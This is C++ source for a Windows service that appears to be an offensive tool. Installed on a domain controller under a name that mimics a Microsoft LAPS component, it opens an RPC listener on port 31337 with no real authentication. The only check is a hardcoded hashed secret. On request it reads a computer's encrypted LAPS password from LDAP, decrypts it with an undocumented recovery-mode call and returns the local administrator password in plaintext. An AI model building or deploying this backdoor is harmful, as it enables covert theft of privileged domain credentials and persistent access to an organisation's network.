#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winsvc.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <locale.h>
#include <io.h>
#include <fcntl.h>
#include <winldap.h>
#include <winber.h>
#include <rpc.h>
#include "Server_h.h"

#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "lapsutil.lib")
#pragma comment(lib, "rpcrt4.lib")

extern "C" __declspec(dllimport) unsigned int __cdecl DecryptRecoveryMode(
    unsigned char* __ptr64,
    unsigned int,
    unsigned char* __ptr64* __ptr64,
    unsigned int* __ptr64
);

// >>> def djb2(s):
// ...     h = 1337
// ...     for x in s:
// ...         h = ((h << 5) + h) + x
// ...     return h & 0xFFFFFFFF
// ...
// >>> hex(djb2([1, 35, 69, 103, 137, 171, 205, 239]))
// '0x78ec3379'
#define SHARED_SECRET  0x78ec3379
#define SERVICE_NAME   L"MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b"

SERVICE_STATUS         g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE  g_StatusHandle = NULL;

#ifdef _DEBUG
#include <stdarg.h>
void debug_print(const wchar_t* format, ...) {
    va_list args;
    va_start(args, format);
    // Always print the [DEBUG] prefix
    wprintf(L"[DEBUG] ");
    vwprintf(format, args);
    va_end(args);
    fflush(stdout);
}
#else
#define debug_print(...) ((void)0)
#endif

unsigned long djb2(const unsigned char* authKey, unsigned int authKeyLen)
{
    unsigned long hash = 1337;
    for (size_t i = 0; i < authKeyLen; i++)
        hash = ((hash << 5) + hash) + authKey[i];

    return hash;
}

wchar_t* BuildResult(const char* timestamp, const wchar_t* message)
{
    wchar_t resultStr[1024] = { 0 };
    if (timestamp[0] != L'\0')
        swprintf(resultStr, 1024, L"%hs|%s", timestamp, message);
    else
        swprintf(resultStr, 1024, L"%s", message);

    size_t len = wcslen(resultStr) + 1;
    wchar_t* result = (wchar_t*)MIDL_user_allocate(len * sizeof(wchar_t));
    if (result)
        wcscpy(result, resultStr);

    return result;
}

UINT DecryptBytesHelper(BYTE* encryptedData, UINT encryptedSize, BYTE** decryptedBytes, UINT* decryptedSize)
{
    UINT ret = DecryptRecoveryMode(encryptedData, encryptedSize, decryptedBytes, decryptedSize);
    if (ret != 0)
        debug_print(L"[-] DecryptRecoveryMode failed with error code: %u\n", ret);
    return ret;
}

error_status_t RPC_ENTRY DecryptPassword(
    /* [in, string] */ const wchar_t* dn,
    /* [in, size_is(authKeyLen)] */ const unsigned char* authKey,
    /* [in] */ unsigned int authKeyLen,
    /* [out, string] */ wchar_t** result
)
{
    debug_print(L"[*] DN        : %s\n", (wchar_t*)dn);
    debug_print(L"[*] KEY[0:7]  : %d, %d, %d, %d, %d, %d, %d, %d\n",
                authKey[0], authKey[1], authKey[2], authKey[3], authKey[4],
                authKey[5], authKey[6], authKey[7]);

    if (authKey == NULL || djb2(authKey, authKeyLen) != SHARED_SECRET)
    {
        debug_print(L"[-] Authentication failed\n\n");
        *result = NULL;
        return ERROR_ACCESS_DENIED;
    }

    char timestamp[64] = { 0 };
    wchar_t errorMsg[512] = { 0 };
    wchar_t decryptedPassword[256] = { 0 };
    BOOL gotTimestamp = FALSE;
    BOOL gotDecrypted = FALSE;

    wchar_t dc[] = L"127.0.0.1";
    LDAP* ld = ldap_initW(dc, LDAP_PORT);
    if (ld == NULL)
    {
        debug_print(L"[-] Failed to initialize LDAP connection\n\n");
        *result = NULL;
        return -1;
    }

    int version = LDAP_VERSION3;
    ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    int rc = ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS)
    {
        debug_print(L"[-] LDAP bind failed: %s\n\n", ldap_err2string(rc));
        ldap_unbind(ld);
        *result = NULL;
        return -2;
    }

    wchar_t filter[512];
    swprintf(filter, sizeof(filter) / sizeof(wchar_t), L"(&(objectClass=computer)(distinguishedName=%s))", dn);

    const wchar_t* attributeList[] = {
        L"msLAPS-PasswordExpirationTime",
        L"msLAPS-EncryptedPassword",
        NULL
    };

    LDAPMessage* resultMsg = NULL;
    rc = ldap_search_sW(ld, (wchar_t*)dn, LDAP_SCOPE_BASE, filter, (LPWSTR*)attributeList, 0, &resultMsg);
    if (rc != LDAP_SUCCESS)
    {
        debug_print(L"[-] LDAP search failed: %s\n\n", ldap_err2string(rc));
        ldap_unbind(ld);
        *result = NULL;
        return -3;
    }

    LDAPMessage* entry = ldap_first_entry(ld, resultMsg);
    if (entry == NULL)
    {
        debug_print(L"[-] Could not find computer object\n\n");
        ldap_msgfree(resultMsg);
        ldap_unbind(ld);
        *result = NULL;
        return -4;
    }

    BerElement* ber = NULL;
    wchar_t* attr = ldap_first_attributeW(ld, entry, &ber);
    while (attr != NULL)
    {
        if (_wcsicmp(attr, L"msLAPS-PasswordExpirationTime") == 0)
        {
            struct berval** vals = ldap_get_values_lenW(ld, entry, attr);
            if (vals && vals[0])
            {
                int len = (int)vals[0]->bv_len / sizeof(char);
                if (len < sizeof(timestamp) / sizeof(char))
                {
                    strncpy(timestamp, (char*)vals[0]->bv_val, len);
                    timestamp[len] = L'\0';
                    gotTimestamp = TRUE;
                }
            }
            ldap_value_free_len(vals);
        }
        else if (_wcsicmp(attr, L"msLAPS-EncryptedPassword") == 0)
        {
            struct berval** vals = ldap_get_values_lenW(ld, entry, attr);
            if (vals && vals[0] && vals[0]->bv_len > 16)
            {
                BYTE* encryptedPass = (BYTE*)vals[0]->bv_val;
                DWORD encryptedLen = vals[0]->bv_len;
                BYTE* encryptedData = encryptedPass + 16;
                DWORD encryptedDataLen = encryptedLen - 16;
                BYTE* decryptedBytes = NULL;
                UINT decryptedSize = 0;
                UINT ret = DecryptBytesHelper(encryptedData, encryptedDataLen, &decryptedBytes, &decryptedSize);
                if (ret == 0 && decryptedBytes != NULL)
                {
                    int numWideChars = decryptedSize / sizeof(wchar_t);
                    if (numWideChars > 0 && numWideChars < 256)
                    {
                        wcsncpy(decryptedPassword, (wchar_t*)decryptedBytes, numWideChars);
                        decryptedPassword[numWideChars] = L'\0';
                        gotDecrypted = TRUE;
                    }
                    LocalFree(decryptedBytes);
                }
                else
                {
                    debug_print(L"[-] Decryption failed with error code: %u\n\n", ret);
                    ldap_value_free_len(vals);
                    ldap_msgfree(resultMsg);
                    ldap_unbind(ld);
                    *result = NULL;
                    return -5;
                }
            }
            ldap_value_free_len(vals);
        }
        attr = ldap_next_attributeW(ld, entry, ber);
    }

    if (ber != NULL)
        ber_free(ber, 0);

    ldap_msgfree(resultMsg);
    ldap_unbind(ld);

    if (!gotDecrypted)
    {
        debug_print(L"[-] Decrypted password not found\n");
        *result = NULL;
        return -6;
    }

    debug_print(L"[+] TIMESTAMP : %hs\n", timestamp);
    debug_print(L"[+] PASSWORD  : %s\n\n", decryptedPassword);
    *result = BuildResult(timestamp, decryptedPassword);

    return 0;
}

RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE Interface, void* pBindingHandle)
{
    return RPC_S_OK;
}

int StartService()
{
    RPC_STATUS status;
    RPC_BINDING_VECTOR* pbindingVector = 0;

    status = RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncacn_ip_tcp",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_WSTR)L"31337",
        NULL
    );
    if (status)
    {
        debug_print(L"[-] RpcServerUseProtseqEp failed: %d\n", status);
        return status;
    }

    status = RpcServerRegisterIf2(
        DecryptRecoveryLAPS_v1_0_s_ifspec,
        NULL,
        NULL,
        RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        (unsigned)-1,
        SecurityCallback
    );
    if (status)
    {
        debug_print(L"[-] RpcServerRegisterIf2 failed: %d\n", status);
        return status;
    }

    status = RpcServerInqBindings(&pbindingVector);
    status = RpcEpRegisterW(
        DecryptRecoveryLAPS_v1_0_s_ifspec,
        pbindingVector,
        0,
        NULL
    );
    if (status)
    {
        debug_print(L"[-] RpcEpRegisterW failed: %d\n", status);
        return status;
    }

    debug_print(L"[*] RPC server is listening on ncacn_ip_tcp:31337 ...\n\n");
    status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
    if (status)
    {
        debug_print(L"[-] RpcServerListen failed: %d\n", status);
        return status;
    }

    return 0;
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
    if (CtrlCode == SERVICE_CONTROL_STOP)
    {
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        RpcMgmtStopServerListening(NULL);
    }
}

void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
    g_StatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL)
        return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    StartService();

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void InstallService()
{
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL)
    {
        debug_print(L"[-] OpenSCManager failed (%d)\n", GetLastError());
        return;
    }

    wchar_t szPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH))
    {
        debug_print(L"[-] GetModuleFileName failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }

    SC_HANDLE schService = CreateServiceW(
        schSCManager,              // SCM database 
        SERVICE_NAME,              // service name 
        SERVICE_NAME,              // display name 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        szPath,                    // path to the service binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL                       // no password 
    );

    if (schService == NULL)
    {
        debug_print(L"[-] CreateService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    else
    {
        debug_print(L"[+] Service installed successfully\n");
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

void UninstallService()
{
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        debug_print(L"[-] OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
    SC_HANDLE schService = OpenServiceW(schSCManager, SERVICE_NAME, DELETE);
    if (schService == NULL)
    {
        debug_print(L"[-] OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    if (!DeleteService(schService))
    {
        debug_print(L"[-] DeleteService failed (%d)\n", GetLastError());
    }
    else
    {
        debug_print(L"[+] Service uninstalled successfully\n");
    }
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

int main(int argc, char* argv[])
{
    _setmode(_fileno(stdout), _O_U8TEXT);
    _setmode(_fileno(stderr), _O_U8TEXT);
    setlocale(LC_ALL, "en_US.UTF-8");

    if (argc > 1)
    {
        if (strcmp(argv[1], "-install") == 0)
        {
            InstallService();
            return 0;
        }
        else if (strcmp(argv[1], "-uninstall") == 0)
        {
            UninstallService();
            return 0;
        }
        else if (strcmp(argv[1], "-console") == 0)
        {
            return StartService();
        }
    }

    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { (LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        wprintf(L"[-] StartServiceCtrlDispatcher failed (%d)\n", GetLastError());
        return GetLastError();
    }
    return 0;
}

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

void __RPC_USER midl_user_free(void* p)
{
    free(p);
}
